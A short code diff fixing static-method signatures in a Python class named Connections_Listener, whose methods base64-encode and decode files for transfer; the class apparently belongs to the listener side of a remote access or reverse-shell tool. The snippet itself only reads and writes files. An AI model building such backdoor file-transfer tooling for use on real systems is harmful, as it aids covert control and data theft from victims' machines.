@@ -41,13 +41,13 @@ class Connections_Listener:
         return self.receive_data()
 
     @staticmethod
-    def download_file(self, path, content):
+    def download_file(path, content):
         with open(path, 'wb') as f:
             f.write(base64.b64decode(content))
             return f"[+] \"{path}\" file download successful"
 
     @staticmethod
-    def upload_files(self, path):
+    def upload_files( path):
         with open(path, 'rb') as f:
             return base64.b64encode(f.read())
 
